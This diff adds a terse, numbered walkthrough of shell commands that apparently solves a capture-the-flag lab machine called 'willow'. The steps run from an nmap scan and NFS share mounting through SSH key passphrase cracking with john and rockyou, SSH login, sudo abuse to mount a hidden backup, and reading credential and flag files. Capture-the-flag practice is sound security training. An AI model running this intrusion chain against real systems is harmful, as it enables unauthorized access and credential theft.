@@ -1,0 +1,14 @@
+1 - nmap -A 10.10.253.160
+2 - curl http://10.10.253.160 | html2text | xxd -r -p
+3 - showmount -e 10.10.253.160
+4 - sudo mount -t nfs 10.10.253.160:/var/failsafe /tmp/willow
+5 - cat rsa_keys -> RSA DECRYPT
+6 - ssh2john id_rsa > hash
+7 - john hash -w=/usr/share/wordlists/rockyou.txt
+8 - ssh -i id_rsa willow@10.10.253.160
+9 - sudo -l 
+10 - ls -l /dev
+11 - sudo mount /dev/hidden_backup /tmp/willow
+12 - cat creds.txt
+13 - steghide extract user.jpg
+14 - cat root.txt
